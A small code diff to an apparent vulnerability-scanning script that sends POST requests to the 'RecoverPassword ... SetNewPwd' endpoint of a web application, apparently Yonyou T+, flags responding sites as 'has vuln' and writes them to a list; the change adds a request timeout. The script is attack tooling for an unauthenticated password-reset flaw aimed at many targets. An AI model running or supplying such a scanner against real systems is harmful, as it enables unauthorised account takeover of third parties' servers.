@@ -22,7 +22,7 @@ def write(u):
 def post_url(u):
 	payload = "/tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd"
 	url = u + payload
-	response = requests.post(url=url,data=data,headers=headers,verify=False)
+	response = requests.post(url=url,data=data,headers=headers,verify=False,timeout=5)
 	if "value" in response.text:
 		print(u + "----------has vuln")
 		write(u)
